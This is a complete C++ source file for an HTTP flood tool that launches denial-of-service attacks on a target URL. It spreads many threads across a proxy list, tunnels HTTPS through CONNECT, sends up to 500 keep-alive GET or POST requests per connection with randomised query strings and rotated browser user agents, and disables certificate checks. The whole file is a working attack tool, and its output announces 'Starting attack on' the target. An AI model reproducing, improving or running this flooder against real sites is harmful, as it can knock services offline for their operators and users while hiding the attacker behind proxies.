#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <atomic>
#include <mutex>
#include <memory>
#include <algorithm>
#include <cstring>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "libssl.lib")
    #pragma comment(lib, "libcrypto.lib")
    #define CLOSE_SOCKET closesocket
    typedef SOCKET socket_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <fcntl.h>
    #include <netinet/tcp.h>
    #define CLOSE_SOCKET close
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    typedef int socket_t;
#endif

#include <openssl/ssl.h>
#include <openssl/err.h>

// ====================== Constants & Utils ======================
constexpr int MAX_REQUESTS_PER_CONN = 500;
constexpr int RECV_BUFFER_SIZE = 4096;

struct SSLDeleter { void operator()(SSL* s) { if(s) SSL_free(s); } };
struct CTXDeleter { void operator()(SSL_CTX* c) { if(c) SSL_CTX_free(c); } };

class Logger {
public:
    static void log(const std::string& msg, int color = 0) {
        static std::mutex mtx;
        std::lock_guard<std::mutex> lock(mtx);
        if (color) std::cout << "\033[" << color << "m";
        std::cout << msg << "\033[0m" << std::endl;
    }
};

// ====================== Core Flooder ======================
class HTTPFlooder {
private:
    std::string targetHost, targetPort, targetPath, mode;
    bool useSSL = false;
    int threadCount, durationSeconds;
    
    std::vector<std::string> proxies;
    std::vector<std::string> userAgents;
    std::unique_ptr<SSL_CTX, CTXDeleter> sslCtx;

    std::atomic<bool> running{false};
    std::atomic<uint64_t> totalSent{0}, successCount{0}, failCount{0};
    std::atomic<int> activeThreads{0};

public:
    HTTPFlooder(const std::string& url, const std::string& m, int threads, int time)
        : mode(m), threadCount(threads), durationSeconds(time) {
        initOpenSSL();
        parseURL(url);
        generateUA();
    }

    void loadProxies(const std::string& filename) {
        std::ifstream file(filename);
        std::string line;
        while (std::getline(file, line)) {
            line.erase(std::remove_if(line.begin(), line.end(), isspace), line.end());
            if (!line.empty()) proxies.push_back(line);
        }
    }

    void start() {
        running = true;
        std::vector<std::thread> workers;
        
        Logger::log("[*] Starting attack on " + targetHost + " for " + std::to_string(durationSeconds) + "s", 33);
        
        for (int i = 0; i < threadCount; ++i)
            workers.emplace_back(&HTTPFlooder::workerLoop, this);

        std::thread(&HTTPFlooder::monitorLoop, this).detach();

        std::this_thread::sleep_for(std::chrono::seconds(durationSeconds));
        running = false;

        for (auto& t : workers) if (t.joinable()) t.join();
        Logger::log("\n[+] Task Completed. Total requests: " + std::to_string(totalSent), 32);
    }

private:
    void initOpenSSL() {
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        sslCtx.reset(SSL_CTX_new(TLS_client_method()));
        // تعطيل التحقق من الشهادة لزيادة السرعة في هجمات الاختبار
        SSL_CTX_set_verify(sslCtx.get(), SSL_VERIFY_NONE, NULL);
    }

    void parseURL(const std::string& url) {
        std::string temp = url;
        if (temp.find("https://") == 0) { useSSL = true; temp.erase(0, 8); }
        else if (temp.find("http://") == 0) { useSSL = false; temp.erase(0, 7); }

        size_t slash = temp.find('/');
        targetPath = (slash == std::string::npos) ? "/" : temp.substr(slash);
        std::string hostPart = temp.substr(0, slash);

        size_t colon = hostPart.find(':');
        if (colon != std::string::npos) {
            targetHost = hostPart.substr(0, colon);
            targetPort = hostPart.substr(colon + 1);
        } else {
            targetHost = hostPart;
            targetPort = useSSL ? "443" : "80";
        }
    }

    void generateUA() {
        userAgents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
        };
    }

    socket_t createRawSocket(const std::string& host, int port) {
        addrinfo hints{}, *res;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        if (getaddrinfo(host.c_str(), std::to_string(port).c_str(), &hints, &res) != 0) return INVALID_SOCKET;

        socket_t s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (s != INVALID_SOCKET) {
            // ضبط مهلة الاتصال
            struct timeval tv {5, 0};
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
            
            if (connect(s, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
                CLOSE_SOCKET(s);
                s = INVALID_SOCKET;
            }
        }
        freeaddrinfo(res);
        return s;
    }

    void workerLoop() {
        activeThreads++;
        std::mt19937 prng(std::random_device{}());
        
        while (running) {
            std::string proxy = proxies[std::uniform_int_distribution<size_t>(0, proxies.size() - 1)(prng)];
            size_t colon = proxy.find(':');
            if (colon == std::string::npos) continue;

            socket_t sock = createRawSocket(proxy.substr(0, colon), std::stoi(proxy.substr(colon + 1)));
            if (sock == INVALID_SOCKET) { failCount++; continue; }

            // CONNECT Tunnel for SSL
            if (useSSL) {
                std::string connectReq = "CONNECT " + targetHost + ":" + targetPort + " HTTP/1.1\r\nHost: " + targetHost + "\r\n\r\n";
                send(sock, connectReq.c_str(), (int)connectReq.size(), 0);
                char buf[512];
                if (recv(sock, buf, sizeof(buf), 0) <= 0) { CLOSE_SOCKET(sock); continue; }
            }

            std::unique_ptr<SSL, SSLDeleter> ssl;
            if (useSSL) {
                ssl.reset(SSL_new(sslCtx.get()));
                SSL_set_fd(ssl.get(), (int)sock);
                SSL_set_tlsext_host_name(ssl.get(), targetHost.c_str());
                if (SSL_connect(ssl.get()) <= 0) { CLOSE_SOCKET(sock); continue; }
            }

            // Keep-alive loop
            for (int i = 0; i < MAX_REQUESTS_PER_CONN && running; ++i) {
                std::string req = (mode == "POST") ? craftPostRequest(prng) : craftGetRequest(prng);
                int sent = useSSL ? SSL_write(ssl.get(), req.c_str(), (int)req.size()) 
                                  : send(sock, req.c_str(), (int)req.size(), 0);
                
                if (sent <= 0) break;
                
                totalSent++;
                char dump[1024]; // قراءة سريعة للتخلص من الاستجابة
                if (useSSL) SSL_read(ssl.get(), dump, sizeof(dump));
                else recv(sock, dump, sizeof(dump), 0);
                successCount++;
            }

            if (useSSL) SSL_shutdown(ssl.get());
            CLOSE_SOCKET(sock);
        }
        activeThreads--;
    }

    std::string craftGetRequest(std::mt19937& gen) {
        return "GET " + targetPath + "?id=" + std::to_string(gen()) + " HTTP/1.1\r\n"
               "Host: " + targetHost + "\r\n"
               "User-Agent: " + userAgents[gen() % userAgents.size()] + "\r\n"
               "Connection: keep-alive\r\n\r\n";
    }

    std::string craftPostRequest(std::mt19937& gen) {
        std::string body = "data=" + std::to_string(gen());
        return "POST " + targetPath + " HTTP/1.1\r\n"
               "Host: " + targetHost + "\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n"
               "Content-Length: " + std::to_string(body.size()) + "\r\n"
               "User-Agent: " + userAgents[gen() % userAgents.size()] + "\r\n"
               "Connection: keep-alive\r\n\r\n" + body;
    }

    void monitorLoop() {
        while (running) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            printf("\r[Monitor] Requests: %llu | Success: %llu | Fails: %llu | Active Threads: %d          ", 
                   totalSent.load(), successCount.load(), failCount.load(), activeThreads.load());
            fflush(stdout);
        }
    }
};

int main(int argc, char** argv) {
#ifdef _WIN32
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
#endif

    if (argc < 6) {
        std::cout << "Usage: " << argv[0] << " <url> <threads> <GET/POST> <time> <proxies.txt>" << std::endl;
        return 1;
    }

    HTTPFlooder flooder(argv[1], argv[3], std::stoi(argv[2]), std::stoi(argv[4]));
    flooder.loadProxies(argv[5]);
    flooder.start();

#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}